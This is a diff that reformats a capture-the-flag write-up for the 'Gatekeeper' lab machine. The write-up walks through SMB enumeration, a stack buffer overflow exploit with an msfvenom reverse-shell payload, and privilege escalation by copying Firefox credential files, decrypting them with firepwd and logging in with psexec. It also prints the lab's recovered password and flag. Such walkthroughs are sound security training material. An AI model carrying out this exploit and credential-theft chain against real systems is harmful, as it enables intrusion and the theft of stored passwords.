@@ -1,9 +1,14 @@
 ---
 sticker: emoji//1f945
 ---
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200 > pattern.txt
-# PORT SCAN
----
+
+# GATEKEEPER
+
+/usr/share/metasploit-framework/tools/exploit/pattern\_create.rb -l 2200 > pattern.txt
+
+## PORT SCAN
+
+***
 
 | PORT      | SERVICE       |
 | --------- | ------------- |
@@ -19,11 +24,9 @@ sticker: emoji//1f945
 | 49161/tcp | msrpc         |
 | 49163/tcp | msrpc         |
 
+## RECONNAISSANCE
 
-
-# RECONNAISSANCE
----
-
+***
 
 As seen, we got `SMV` enabled, let's use `smbclient` to connect anonymously:
 
@@ -39,7 +42,6 @@ Can't load /etc/samba/smb.conf - run testparm to debug it
 	Users           Disk
 SMB1 disabled -- no workgroup available
 ```
-
 
 We got an `Users` share:
 
@@ -64,15 +66,12 @@ smb: \Share\> dir
 		7863807 blocks of size 4096. 3876413 blocks available
 ```
 
-
 As seen, we got a `gatekeeper.exe` file, we can get this file into our machine:
-
 
 ```
 smb: \Share\> get gatekeeper.exe
 getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (18.5 KiloBytes/sec) (average 18.5 KiloBytes/sec)
 ```
-
 
 By testing the open ports with netcat, we can see this on port `31337`:
 
@@ -88,18 +87,17 @@ This is vulnerable to buffer overflow, we can now this by generating characters 
 python -c "print('A'*1000)"
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530170602.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530170602.png)
 
 As seen, the program crashes automatically, with all these, we can use `immunity debugger` to construct our exploit.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 Since the process is pretty much the same as the `Buffer Overflow Prep Room`, we can save a lot of time by doing this simple steps inside of immunity debugger on a self windows 7 machine or even the machine provided by that room, for the sake of simplicity, refer to my writeup for the `Buffer Overflow Prep Room` machine or simply modify this exploit, if you don't want to check but do it manually, you need to follow these steps:
 
-#### 1. Test for a crash with a basic fuzzing payload
+**1. Test for a crash with a basic fuzzing payload**
 
 Send a large number of characters to see if the service crashes:
 
@@ -107,11 +105,11 @@ Send a large number of characters to see if the service crashes:
 python -c "print('A'*1000)"
 ```
 
-#### 2. Move the binary to a Windows machine for debugging
+**2. Move the binary to a Windows machine for debugging**
 
 Transfer the vulnerable binary to a Windows 7 VM and open it using **Immunity Debugger** to monitor behavior and track the EIP register.
 
-#### 3. Generate a unique pattern to identify the offset
+**3. Generate a unique pattern to identify the offset**
 
 Use Metasploit’s `pattern_create.rb` tool to generate a 1000-character unique pattern:
 
@@ -121,11 +119,11 @@ Use Metasploit’s `pattern_create.rb` tool to generate a 1000-character unique 
 
 Note: The path may vary depending on your system, sometimes found in `/usr/share/metasploit-framework/tools/exploit/`.
 
-#### 4. Send the pattern and crash the service
+**4. Send the pattern and crash the service**
 
 Use the generated pattern in your payload and crash the service to overwrite the EIP. Take note of the EIP value after the crash.
 
-#### 5. Find the exact offset to EIP
+**5. Find the exact offset to EIP**
 
 Use Mona’s `findmsp` command to locate the offset where EIP is overwritten:
 
@@ -133,27 +131,24 @@ Use Mona’s `findmsp` command to locate the offset where EIP is overwritten:
 !mona findmsp -distance 1000
 ```
 
-
 Result: Exact offset found at **146 bytes**.
 
-
-#### 6. Confirm EIP control
+**6. Confirm EIP control**
 
 Edit your exploit script to send:
 
-- 146 bytes of junk (`"A"*146`)
-- Followed by `"BBBB"` (to observe `42424242` in EIP)
+* 146 bytes of junk (`"A"*146`)
+* Followed by `"BBBB"` (to observe `42424242` in EIP)
 
 If EIP is overwritten with `42424242`, you have control.
 
-#### 7. Identify bad characters
+**7. Identify bad characters**
 
 Generate a byte array excluding `\x00` (null byte) by default:
 
 ```
 !mona bytearray -b "\x00"
 ```
-
 
 Send the byte array in your payload and compare it in Mona:
 
@@ -162,10 +157,9 @@ Send the byte array in your payload and compare it in Mona:
 # You can check the esp address at the right side of immunity.
 ```
 
-Result: Bad characters identified: `\x00`, `\x0a`
-Repeat the process, excluding each new bad character, until Mona returns "Unmodified".
+Result: Bad characters identified: `\x00`, `\x0a` Repeat the process, excluding each new bad character, until Mona returns "Unmodified".
 
-#### 8. Find a `JMP ESP` address
+**8. Find a `JMP ESP` address**
 
 Search for a `JMP ESP` instruction in a module with **ASLR** and **SafeSEH** disabled:
 
@@ -175,7 +169,7 @@ Search for a `JMP ESP` instruction in a module with **ASLR** and **SafeSEH** dis
 
 Copy the safe JMP address found (e.g., `0x625011af`).
 
-#### 9. Generate shellcode with `msfvenom`
+**9. Generate shellcode with `msfvenom`**
 
 Create a reverse shell payload, excluding the bad characters:
 
@@ -183,13 +177,11 @@ Create a reverse shell payload, excluding the bad characters:
 msfvenom -p windows/shell_reverse_tcp LHOST=LPORT=4444 -b "\x00\x0A" -f c -e x86/shikata_ga_nai
 ```
 
-#### 10. Build the final exploit
+**10. Build the final exploit**
 
-#### 11. Launch the attack.
+**11. Launch the attack.**
 
-
-
-Here's the final script you should have, 
+Here's the final script you should have,
 
 ```python
 #!/usr/bin/env python3
@@ -255,7 +247,7 @@ print("[+] Done. Check your listener for a shell!")
 
 We need to start a listener and launch the exploit:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530172927.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530172927.png)
 
 We got access as user `natbat`, let's get our user flag and begin privilege escalation:
 
@@ -267,17 +259,15 @@ The buffer overflow in this room is credited to Justin Steven and his
 "dostackbufferoverflowgood" program.  Thank you!
 ```
 
-
 Let's begin privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
-
+***
 
 First thing we can notice on this machine is that we have direct access on our desktop for `firefox`, this is not usual and could lead us to check if there's any password or something like that on there:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530173250.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530173250.png)
 
 We can go to:
 
@@ -285,7 +275,7 @@ We can go to:
 C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530173333.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530173333.png)
 
 We got a `ljfn812a.default-release` directory, this directory contains login information for the browser, if we check the contents of this directory, we can find this:
 
@@ -347,7 +337,6 @@ As seen, we got a `key4.db` and `logins.json` file, investigating through intern
 git clone https://github.com/lclevy/firepwd.git
 ```
 
-
 We need a way to get those files, we can either download `netcat` into the windows machine which is the slowest path, or copy the two files into `C:\Users\Share` and use smbclient to get them:
 
 ```
@@ -357,7 +346,7 @@ copy logins.json C:\Users\Share\logins.json
 
 Now, we can get them in `smbclient`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530174002.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530174002.png)
 
 ```
 get key4.db
@@ -429,8 +418,7 @@ decrypting login/password pairs
    https://creds.com:b'mayor',b'8CL7O1N78MdrCIsV'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530174226.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530174226.png)
 
 As seen, we got our credentials:
 
@@ -444,19 +432,15 @@ We can now use `psexec.py` and login with this credentials:
 python3 psexec.py WORKGROUP/mayor:8CL7O1N78MdrCIsV@IP cmd.exe
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530174926.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530174926.png)
 
 There we go, let's read `root` flag:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530175035.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530175035.png)
 
 ```
 C:\Users\mayor\Desktop> type root.txt.txt
 {Th3_M4y0r_C0ngr4tul4t3s_U}
 ```
 
-
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250530175102.png)
-
+![](gitbook/cybersecurity/images/Pasted%20image%2020250530175102.png)
